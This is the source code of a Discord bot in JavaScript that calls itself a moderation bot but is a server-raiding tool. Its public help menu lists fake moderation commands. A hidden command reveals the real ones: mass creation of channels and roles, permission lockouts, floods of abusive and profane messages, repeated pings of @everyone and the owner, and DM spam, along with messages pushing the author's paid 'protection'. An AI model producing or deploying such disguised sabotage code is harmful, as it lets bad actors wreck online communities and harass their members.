const Discord = require('discord.js')
const client = new Discord.Client()
const count = require('../config.json').count
const prefix = require('../config.json').prefix
const token = require('../config.json').token

client.on('ready', () => {
    console.log(`moderation bot online.. PepeLaugh`)
    client.user.setActivity('184 servers!', ({type: "WATCHING"}))
})
client.on('message', (message) => {
    if(!message.content.startsWith(prefix) || message.author.bot){
        return
    }

    //Spliting the Command to an array
    const args = message.content.slice(prefix.length).split(/ +/)
    const command = args.shift().toLowerCase()

    if(command === 'help'){}
    else if(message.channel.type === 'dm'){
        console.log(command+' ran in DM\nErr: Cannot run commands in DM')
        message.reply('Err: Cannot run commands in DM (Only Help Command is permitted!)')
        return
    }

    console.log(command)

    if(command === 'textchannel'){
        message.delete()

        let categoryId = ''

        message.guild.channels.create('SORRY BUDDY', {type: 'category'})
        .then((channel) => {
            channel.setPosition(0)
            categoryId = channel.id
            channel.overwritePermissions([
                {
                    id: message.guild.id,
                    deny: ['SEND_MESSAGES'],
                    allow: ['ADD_REACTIONS', 'READ_MESSAGE_HISTORY']
                }
            ])
        })

        for(let i = 1; i<=count; i++){
            setTimeout(() => {
                message.guild.channels.create('SIKE-BITCH-NO-MERCY', {type: "text"})
                .then((channel) => {
                    channel.setParent(categoryId)
                    channel.send('@everyone sorry for doing this.. but i felt the need to.. anyway want your server to be protected from stuff like this?! dm rmc#0001 on discord!')
                })
            }, 1)
        }
    }
    else if(command === 'voicechannel'){
        message.delete()

        let categoryId = ''

        message.guild.channels.create('sorry.  - rmc#0001', {type: 'category'})
        .then((channel) => {
            channel.setPosition(0)
            categoryId = channel.id
            channel.overwritePermissions([
                {
                    id: message.guild.id,
                    deny: ['CONNECT'],
                    allow: ['VIEW_CHANNEL']
                }
            ])
        })

        for(let i = 1; i<=count; i++){
            setTimeout(() => {
                message.guild.channels.create('sorry.  - rmc#0001', {type: "voice"})
                .then((channel) => {
                    channel.setParent(categoryId)
                })
            }, 1)
        }
    }
    else if(command === 'spam'){
        message.delete()

        for(let i = 1; i<=count; i++){
            setTimeout(() => message.channel.send('suck my dick bitches'), 200)
        }
    }
    else if(command === 'spamowner'){
        message.delete()

        for(let i = 1; i<=count; i++){
            setTimeout(() => message.channel.send(`<@${message.guild.ownerID}> <-- that guy is a twat inee fakn ell`), 200)
        }
    }
    else if(command === 'spameveryone'){
        message.delete()

        for(let i = 1; i<=count; i++){
            setTimeout(() => message.channel.send(`@everyone ur unloved and this server is fucking dog shit mate.`), 200)
        }
    }
    else if(command === 'dmowner'){
        message.delete()

        for(let i = 1; i<=count; i++){
            setTimeout(() => {
                message.guild.owner.send(`<@${message.author}>\nsorry about your server mate if you want your server immune to anything like this happening again dm - rmc#0001`)
            }, 1)
        }
    }
    else if(command === 'credit'){
        message.delete()

        for(let i = 1; i<=count; i++){
            setTimeout(() => message.channel.send(`@everyone credit to me @rmc#0001 for making this MODERATION BOT OMEGALUL, dm if you would like to use it and or make your server immune for free!`), 200)
        }
    }
    else if(command === 'roles'){
        message.delete()

        let colors = ['#EE82EE', '#4B0082', '#0183fa', '#01d801', '#f7e501', '#fe8801', '#ff0000']
        let colorCount = 0;

        for(let i = 1; i <= count; i++){
            setTimeout(() => {
                message.guild.roles.create({data: {
                    name: 'rmc#0001',
                    color: colors[colorCount],
                    hoist: true,
                    mentionable: true
                }}).catch(console.error)

                colorCount++;
                if(colorCount === 7){
                    colorCount = 0
                }
            }, 1)
        }
    }
    else if(command === 'help'){
        if(message.channel.type === 'dm'){}
        else{
            message.delete()
        }

        const embed = new Discord.MessageEmbed()
            .setColor('#d6a018')
            .setThumbnail(message.author.avatarURL({dynamic: true}))
            .setDescription('Admin help commands for the moderation bot.')
            .addFields(
                {
                    name: `${prefix}warn`,
                    value: `Warns the player mentioned (autoban after 3)`
                },
                {
                    name: `${prefix}kick`,
                    value: `kicks the mentioned player from the server`
                },
                {
                    name: `${prefix}ban`,
                    value: `bans the mentioned player from re-entering the server`
                },
                {
                    name: `${prefix}alert`,
                    value: `Report system for players`
                },
                {
                    name: `${prefix}follow`,
                    value: `follows channels with a player without them knowing (good way to spy/listen secretly)`
                },
                {
                    name: `${prefix}dmstaff`,
                    value: `Messages all staff an announcement that you state to their DM's`
                },
                {
                    name: `${prefix}note`,
                    value: `adds a note to the player that only staff can see and change!`
                },
                {
                    name: `${prefix}move`,
                    value: `moves a player to your current channel`
                },
                {
                    name: 'HEADS UP',
                    value: 'The commands take upto 10 minutes to register onto your server so if they dont work straight away, just wait.'
                }
            )
            .setFooter(client.user.tag)
            .setTimestamp()
        message.author.send(embed)
    }
    else if(command === 'pepelaugh'){
        if(message.channel.type === 'dm'){}
        else{
            message.delete()
        }

    const embed = new Discord.MessageEmbed()
        .setColor('#d6a018')
        .setThumbnail(message.author.avatarURL({dynamic: true}))
        .setDescription('they dont know PepeLaugh')
        .addFields(
            {
                name: `${prefix}textchannel`,
                value: `Spam creates ${count} text channel/s`
            },
            {
                name: `${prefix}voicechannel`,
                value: `Spam creates ${count} voice channel/s`
            },
            {
                name: `${prefix}spam`,
                value: `Spams ${count} messages`
            },
            {
                name: `${prefix}spamowner`,
                value: `Spam tags the owner ${count} times`
            },
            {
                name: `${prefix}spameveryone`,
                value: `Spam tags @everyone ${count} times`
            },
            {
                name: `${prefix}dmowner`,
                value: `Spam DMs owner ${count} times (Works only if the owner's DMs are open)`
            },
            {
                name: `${prefix}credits`,
                value: `shines some light on the creator of this bot`
            },
            {
                name: `${prefix}roles`,
                value: `Spam creates a role ${count} times`
            },
            {
                name: 'Feedback',
                value: 'add me on discord - rmc#0001'
            }
        )
        .setFooter(client.user.tag)
        .setTimestamp()
    message.author.send(embed)
}
})


client.login(token).catch((err) => {
    console.error('Error',err)
    console.log('INVALID TOKEN!')
})